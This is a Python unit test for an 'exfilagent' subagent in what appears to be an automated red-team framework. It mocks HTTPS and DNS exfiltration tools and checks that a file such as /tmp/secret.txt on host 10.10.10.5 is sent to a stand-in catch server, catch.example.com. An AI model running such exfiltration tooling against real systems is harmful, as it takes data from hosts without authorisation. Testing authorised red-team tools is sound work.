# tests/unit/subagents/test_exfilagent.py
import pytest
from unittest.mock import AsyncMock, patch

from autored.models.postex import ExfilEvidence
from autored.subagents.exfilagent import (
    exfilagent_subagent,
    ExfilAgentOutput,
)
from autored.tools.exfil import ExfilResult


@pytest.mark.asyncio
async def test_exfilagent_uses_https_method():
    """ExfilAgent wraps exfil_https for the 'https' method and returns
    an ExfilEvidence record pointing at the catch server."""
    fake_result = ExfilResult(
        method="https",
        source_host="10.10.10.5",
        data_size_bytes=0,
        catch_server="catch.example.com",
        catch_server_log_path="/var/log/autored/catch/10.10.10.5.log",
    )

    with patch("autored.subagents.exfilagent.exfil_https") as mock_https, \
         patch("autored.subagents.exfilagent.exfil_dns") as mock_dns:
        mock_https.ainvoke = AsyncMock(return_value=fake_result)
        mock_dns.ainvoke = AsyncMock(return_value=None)

        result = await exfilagent_subagent.ainvoke({
            "host_ip": "10.10.10.5",
            "file_path": "/tmp/secret.txt",
            "catch_server": "catch.example.com",
            "method": "https",
            "engagement_id": "test",
        })

    assert isinstance(result, ExfilAgentOutput)
    assert result.host_ip == "10.10.10.5"
    assert result.method == "https"
    assert isinstance(result.evidence, ExfilEvidence)
    assert result.evidence.method == "https"
    assert result.evidence.source_host == "10.10.10.5"
    assert result.evidence.catch_server == "catch.example.com"
    assert (
        result.evidence.catch_server_log_path
        == "/var/log/autored/catch/10.10.10.5.log"
    )

    mock_https.ainvoke.assert_awaited_once()
    mock_dns.ainvoke.assert_not_awaited()
